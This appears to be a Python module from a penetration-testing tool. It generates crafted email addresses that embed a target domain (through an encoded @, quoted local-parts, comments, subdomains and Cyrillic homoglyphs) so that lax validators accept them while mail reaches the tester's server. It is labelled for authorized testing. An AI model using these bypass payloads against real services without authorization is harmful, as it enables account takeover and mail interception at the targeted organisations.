"""Crafted email-address builder — victim-domain embedding for email-validation bypass and
parser-confusion testing.

Each generated address embeds a target ("victim") domain so a validator that allow-lists or
substring-matches it accepts the address, while SMTP still delivers to this box's MX. When a
correlation segment (the engagement ob-token) is supplied it is embedded, dot-delimited, so
caught mail resolves back through :func:`oobox.tokens.label_from_rcpt`; the ``correlates``
field on every entry is that function's *actual* result for the address, so the operator sees
exactly where mail to it will land — never a guess.

Two shapes, per the classic bypass patterns:
    (.*)victim.tld(.*)@oob.tld        — victim domain in the local-part
    random@(.*)victim.tld(.*).oob.tld — victim domain in the subdomain

FOR AUTHORIZED TESTING ONLY.
"""
from __future__ import annotations

from .tokens import label_from_rcpt

# ASCII -> Cyrillic look-alikes for the homoglyph "validator payload" (not delivered).
_CONFUSABLE = {"a": "а", "e": "е", "o": "о", "c": "с",
               "p": "р", "x": "х", "y": "у"}


def _homoglyph(s: str) -> str:
    return "".join(_CONFUSABLE.get(ch, ch) for ch in s)


def craft_addresses(oob: str, victim: str, token: str | None = None) -> list[dict]:
    """Crafted catch-addresses embedding ``victim`` under the ``oob`` zone.

    Each entry: ``{kind, address, deliverable, sendable, correlates, note}``.
    ``deliverable`` — reaches this box's MX; ``sendable`` — safe to also send *from* via
    ``POST /send`` (clean shapes only, and only when a token gives a stable sender identity);
    ``correlates`` — the label/token caught mail actually buckets under.
    """
    oob = (oob or "").rstrip(".").lower()
    victim = (victim or "").rstrip(".").lower()
    c = (token or "").strip().lower()
    pre = f"{c}." if c else ""          # correlation segment, dot-delimited, leading
    suf = f".{c}" if c else ""          # …or trailing
    tok = bool(c)

    out: list[dict] = []

    def add(kind, address, deliverable, sendable, note):
        out.append({"kind": kind, "address": address, "deliverable": deliverable,
                    "sendable": sendable, "note": note,
                    "correlates": label_from_rcpt(address, oob)})

    # --- victim in the local-part:  (.*)victim.tld(.*)@oob.tld ---
    add("local-suffix", f"{pre}{victim}@{oob}", True, tok,
        "victim domain trails the local-part; delivers to your MX")
    add("local-prefix", f"{victim}{suf}@{oob}", True, tok,
        "victim domain leads the local-part")
    add("encoded-at", f"{pre}{victim}%40{oob}@{oob}", True, False,
        "%40 splits parsers: a lax one reads victim.tld@oob, SMTP delivers to the final @oob")
    add("quoted-local", f'"{pre}{victim}"@{oob}', True, False,
        "quoted local-part; some validators unquote and read the victim domain")
    add("comment", f"{pre}{victim}(x)@{oob}", True, False,
        "RFC5322 comment; a lax validator ignores (x) — some MTAs reject it in transit")

    # --- victim in the subdomain:  random@(.*)victim.tld(.*).oob.tld ---
    add("sub-token-first", f"random@{pre}{victim}.{oob}", True, tok,
        "victim domain as a subdomain of your zone")
    add("sub-victim-first", f"random@{victim}{suf}.{oob}", True, tok,
        "victim domain leads the host, correlation label follows")
    add("confusable", f"random@{pre}{_homoglyph(victim)}.{oob}", False, False,
        "homoglyph of the victim domain — for the target's validator (may not deliver)")

    return out
